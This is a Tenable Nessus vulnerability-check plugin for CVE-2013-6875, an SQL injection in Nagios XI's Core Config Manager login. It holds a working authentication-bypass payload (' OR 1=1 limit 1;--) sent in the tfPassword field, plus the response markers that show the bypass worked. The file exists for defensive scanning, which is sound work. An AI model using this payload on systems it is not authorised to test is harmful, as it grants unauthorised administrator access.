#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(71636);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 21:17:12 $");

  script_cve_id("CVE-2013-6875");
  script_bugtraq_id(63754);
  script_osvdb_id(99942);

  script_name(english:"Nagios XI < 2012R2.4 tfPassword Parameter SQL Injection");
  script_summary(english:"Attempts to inject SQL code via the 'tfPassword' parameter");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote host has a web application that is affected by a SQL
injection vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server hosts a version of Nagios Core Config Manager, a
modified version of NagiosQL for Nagios XI, and is affected by a SQL
injection vulnerability.  The vulnerability exists in the
'functions/prepend_adm.php' script, which fails to properly sanitize
user-supplied input to the 'tfPassword' parameter before using it in
database queries.  This could allow an attacker to manipulate such
queries, resulting in manipulation or disclosure of arbitrary data."
  );
  script_set_attribute(attribute:"see_also", value:"http://assets.nagios.com/downloads/nagiosxi/CHANGES-2012.TXT");
  # http://www.security-assessment.com/files/documents/advisory/NagiosQL%20Core%20Config%20Manager%20SQL%20Injection%20Vulnerability%20Advisory%20-%20DA.pdf
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?888e1914");
  script_set_attribute(attribute:"solution", value:"Upgrade to Nagios XI 2012R2.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/11/13");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/09/24");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/12/26");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:nagios:nagios_xi");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:nagiosql:nagiosql");

  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_GATHER_INFO);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("nagios_enterprise_detect.nasl", "nagiosql_detect.nbin");
  script_require_keys("www/nagios_xi", "www/nagiosql");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("url_func.inc");
include("webapp_func.inc");

# Get the ports that web servers have been found on.
port = get_http_port(default:80, php:TRUE);

# Get details of the install.
nagiosql_install = get_install_from_kb(appname:"nagiosql", port:port, exit_on_fail:TRUE);

dir = nagiosql_install["dir"];

url = build_url(port:port, qs:dir + "/");
sql = urlencode(str:'\') OR 1=1 limit 1;-- ');
postdata = "tfUsername=" + SCRIPT_NAME + "&tfPassword=" + sql + "&Submit=Login";
item = dir + "/index.php";
contenttype = "application/x-www-form-urlencoded";

res = http_send_recv3(
  method         : "POST",
  item           : item,
  data           : postdata,
  content_type   : contenttype,
  port           : port,
  follow_redirect: 1,
  exit_on_fail   : TRUE
);

if (
  "Configuration User: nagiosadmin" >< res[2] &&
  'logout=yes">Logout</a></td>' >< res[2]
)
{
  set_kb_item(name:"www/"+port+"/SQLInjection", value:TRUE);

  # Report our findings.
  if (report_verbosity > 0)
  {
    report =
      '\nNessus was able to verify the issue exists by using the following ' +
      'request information :' +
      '\n' +
      '\n' + "POST " + item +
      '\n' + "Content-Type: " + contenttype +
      '\n' +
      '\n' + postdata +
      '\n';
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, "Nagios XI", url, "Nagios Core Config Manager");
